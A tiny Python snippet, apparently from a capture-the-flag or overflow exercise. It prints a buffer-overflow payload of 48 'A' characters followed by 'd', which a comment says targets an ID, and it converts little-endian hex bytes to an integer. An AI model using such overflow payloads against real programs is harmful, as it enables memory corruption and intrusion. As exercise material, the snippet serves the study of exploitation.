def mem_reverse(string):
    prep_str = "".join(string.split(" ")[::-1])
    return int(f"0x{prep_str}", 16)

# Overflow buffer, then add "d", since it's the ID for the star
print("A"*48 + "d")

print(mem_reverse("4f 4f 50 53"))